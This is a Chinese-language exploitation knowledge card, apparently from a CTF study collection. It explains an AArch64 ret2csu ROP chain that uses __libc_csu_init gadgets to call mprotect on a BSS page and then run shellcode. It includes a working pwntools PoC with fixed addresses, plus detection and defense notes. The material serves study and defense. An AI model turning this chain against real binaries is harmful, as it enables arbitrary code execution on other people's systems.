---
id: binary-pwn-rop-aarch64-ret2csu-mprotect-shellcode
title: AArch64 ret2csu：借 __libc_csu_init 的 LDP 装载 x19-x24 控制 x0-x3 调 mprotect 后跳 BSS shellcode
type: scenario
domain: binary
path: binary/pwn/rop
technique: aarch64-ret2csu-ldp-x19-x24-mprotect-shellcode
aliases:
- aarch64 ret2csu
- ARM64 ret2csu
- baby_arm
- LDP X19 X20
- x21 x22 x23 x24 gadget
- mprotect bss shellcode
tags:
- pwn
- aarch64
- arm64
- ret2csu
- rop
- mprotect
- shellcode
- qemu
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V621
  verified_at: '2026-11-12T21:53:00+08:00'
  notes: 已对照原文全文与33张图核对：图26 checksec aarch64-64-little/No canary/No PIE(0x400000)/NX enabled；图27 gdb-multiarch set architecture aarch64/target remote；图28-29 确认参数寄存器 x0-x2（setvbuf 调用现场）；图30 程序自带 mprotect(&off_411000,0x1000,0) 的调用存在；图31-33 反汇编确认 loc_4008AC(LDR X3,[X21,X19,LSL#3];MOV X2,X22;MOV X1,X23;MOV W0,W24;ADD X19,#1;BLR X3;CMP X19,X20;B.NE) 与 loc_4008CC(LDP X19,X20,[SP,#var_s10];...;LDP X29,X30,[SP+var_s0],#0x40;RET)；exp 中 offset=0x48、csu_down=0x4008CC、csu_up=0x4008AC、mprotect_got=0x411030、shellcode_addr=0x411068 与卡内 PoC 逐项一致，x19=0/x20=1 循环一次后经第二段 csu_down 以 x30=shellcode 返回。CTF 题无 affected_versions/CVE。dedup：与 x86/MIPS ret2csu 的寄存器与指令序列不同，与 mprotect-bss-rwx 卡（程序自身固定 mprotect+ret2shellcode）的设参方式不同，非同一链，保留。
---

## 一句话结论

AArch64 程序没有 x86 那样现成的 `pop rdi/rsi/rdx` 时，可复用 `__libc_csu_init` 风格的通用 gadget：先用 `LDP X19,X20 / X21,X22 / X23,X24` 从栈上装载寄存器，再进入循环体用 `MOV X2,X22; MOV X1,X23; MOV W0,W24; LDR X3,[X21,X19,LSL#3]; BLR X3` 设置 `x0–x3` 并调用函数指针，最后 `LDP X29,X30,[SP],#0x40; RET` 跳到下一个地址。用它调用 `mprotect(bss,0x1000,7)` 把写入 shellcode 的 BSS 页改为 RWX，再跳入 shellcode 即可 getshell/读 flag。

## 原理

- **AArch64 调用约定**：参数依次放 `x0`–`x7`，返回值在 `x0`；返回地址在 `x30`（`LR`），`RET` 即跳 `x30`。栈溢出覆盖保存的 `x29/x30` 后即可控制返回目标。
- **两段式 csu gadget**：
  ```asm
  loc_4008AC:
      LDR X3, [X21, X19, LSL#3]   ; x3 = *(x21 + x19*8)
      MOV X2, X22                 ; x2 = x22
      MOV X1, X23                 ; x1 = x23
      MOV W0, W24                 ; x0 = x24（低 32 位）
      ADD X19, X19, #1
      BLR X3                      ; 调用函数指针
      CMP X19, X20
      B.NE loc_4008AC             ; 计数未到则循环
  loc_4008CC:
      LDP X19, X20, [SP, #var_s10]
      LDP X21, X22, [SP, #var_s20]
      LDP X23, X24, [SP, #var_s30]
      LDP X29, X30, [SP, #var_s0], #0x40
      RET                         ; 跳 x30
  ```
  第一段负责把栈上连续 8 个 qword 装进 `x19–x24/x29/x30`；第二段循环把 `x21+x19*8` 处的函数指针取到 `x3`，同时用 `x22/x23/x24` 设置 `x2/x1/x0` 后 `blr x3`，循环计数到 `x20` 后落入 `LDP ... RET`，由 `x30` 跳到下一目标。
- **mprotect + shellcode 用法**：程序第一次 `read` 把 shellcode 读到固定 BSS（本例 `0x411068`），第二次栈溢出用 csu 调 `mprotect(shellcode_addr, 0x1000, 7)`（`x0/x1/x2` 分别由 `x24/x23/x22` 提供，`x3` 从 `mprotect@GOT` 取到 libc 的 `mprotect` 地址），随后 `x30` 设为 shellcode 地址，`RET` 后直接执行。
- **为什么可行**：`__libc_csu_init` 为调用构造函数数组保留了这套通用装载/间接调用序列，二进制里天然存在；它同时提供“设参数”和“调内存中的函数指针”两种能力，等价于 x86 的 ret2csu（`pop rbx/rbp/r12-r15` + `call [r12+rbx*8]`），只是寄存器与指令换成 AArch64 的 `LDP`/`BLR`。
- **与 x86 ret2csu 的差异**：AArch64 的参数寄存器是 `x0–x7`，csu 循环里 `W0` 只写 `x0` 低 32 位（本例 mprotect 地址/长度均为小值，够用）；`RET` 目标由 `x30`（由 `LDP` 从栈加载）决定，不需要 `pop` 指令。

## 触发条件

- AArch64（`aarch64-64-little`）ELF，存在可覆盖保存 `x29/x30` 的栈溢出。
- 程序含 `__libc_csu_init` 风格的 LDP/循环 gadget（常见于非 PIE、Partial RELRO 的静态/动态程序），且能找到其两段地址。
- 程序有可写 BSS/数据段且首次读入可写入 shellcode；有 `mprotect`（PLT/GOT 或直接地址）可调用。
- 知道 shellcode 落点与 gadget 地址（无 PIE 直接读；有 PIE 需先泄露）。
- 本地有 `qemu-aarch64 -L /usr/aarch64-linux-gnu` 与 `gdb-multiarch`（`set architecture aarch64`）用于调试。

## 利用步骤

1. `checksec`/`file` 确认 AArch64、NX、PIE、canary；反汇编定位 `__libc_csu_init` 的两段 gadget 与 `mprotect@plt/@got`。
2. 找到第一次 `read` 的目标地址（本例 BSS `0x411068`），确保可写入 shellcode。
3. 计算栈溢出偏移到保存 `x29/x30`（本例 `0x48`）。
4. 第一段输入发送 `shellcraft.aarch64.sh()` 到 BSS。
5. 第二段输入构造 payload：`填充 + csu_down + (0, csu_up) + (x19,x20) + (call_got,x2) + (x1,x0) + (x29,x30=shellcode)`，其中 `x19=0,x20=1,x21=mprotect_got,x22=7,x23=0x1000,x24=shellcode_addr`。
6. 触发后 `mprotect` 把 BSS 页改为 RWX，`RET` 跳入 shellcode；用 gdb 在 `BLR X3` 处确认 `x0/x1/x2` 与 `x3` 指向 `mprotect`。
7. 接收 shell/flag 输出。

## PoC

```python
from pwn import *

context(arch='aarch64', os='linux', log_level='debug')
p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "./pwn"])
# 调试：process(["qemu-aarch64","-L","/usr/aarch64-linux-gnu/","-g","1234","./pwn"])

mprotect_got = 0x411030
csu_down     = 0x4008CC   # LDP X19..X30; RET
csu_up       = 0x4008AC   # LDR X3,[X21,X19,LSL#3]; ...; BLR X3
offset       = 0x48
shellcode_addr = 0x411068

def csu(x19, x20, call_got, x2, x1, x0, call_shell):
    pl  = b'a' * offset
    pl += p64(csu_down)
    pl += p64(0) + p64(csu_up)
    pl += p64(x19) + p64(x20)       # x19 x20
    pl += p64(call_got) + p64(x2)   # x21 x22
    pl += p64(x1) + p64(x0)         # x23 x24
    pl += p64(0) + p64(call_shell)  # x29 x30
    pl += p64(0) * 6
    return pl

shellcode = asm(shellcraft.aarch64.sh())
p.sendafter(b'Name:', shellcode)

p.send(csu(0, 1, mprotect_got, 7, 0x1000, shellcode_addr, shellcode_addr))
p.interactive()
```

说明：`csu_down`/`csu_up`/`mprotect_got`/BSS 地址为该题固定值，换题目需按实际二进制重定位；`x20=1` 使循环体执行一次后退出到 `LDP ... RET`，`x30=shellcode_addr` 完成最终跳转。

## 变体与关联

- MIPS 的同类 `__libc_csu_init` ret2csu（`s0-s5` 装载、`a0-a2` 布置）见 [[binary-pwn-rop-mips-ret2csu-libc-csu-init]]。
- ARM32 若无 csu 可用，常用 `pop {r0, r4, pc}` 供参见 [[binary-pwn-rop-arm32-stripped-ret2libc-pop-r0-static]]；无直控 gadget 时可用组合 gadget [[binary-pwn-rop-arm32-composed-gadget-r0-from-r7-blx-r3]]。
- 若目标没有 `mprotect`，可用 ROP 直接调 `open/read/write` 的 ORW 链；若为静态链接，可寻找 `svc`/`syscall` gadget 设置 `x8` 后直接系统调用。
- 若 shellcode 落点不在可 mprotect 的页或不可写，可改用 `read` 二阶段把 shellcode 读入已知 RWX 段；若开启 PIE，需先泄露基址再定位 gadget 与 GOT。
- 异构架构 QEMU/gdb-multiarch 调试见 [[code-analysis-dynamic-debugging-heterogeneous-arch-qemu-gdb-multiarch]]。

## 检测与防御

- 防御：开启 PIE/ASLR、栈 canary 与全 RELRO；编译时消除或保护 `__libc_csu_init` 类通用 gadget；启用 BTI/PAC（ARMv8.5+）提高 ROP/间接调用门槛。
- 防御：BSS/数据页保持 NX，避免 `mprotect` 可被任意调用；对 `mprotect(PROT_EXEC)` 的调用做审计/限制。
- 检测：关注进程中 `mprotect` 将非代码段改为 RWX 后立即跳转执行的行为；AArch64 崩溃现场 `x30/pc` 指向 `__libc_csu_init` gadget、`x19-x24` 呈攻击者可控值。
- 检测：CTF 之外监控 `mprotect` 参数（地址落在 BSS/堆、长度整页、prot=7）与随后 shellcode 执行序列。
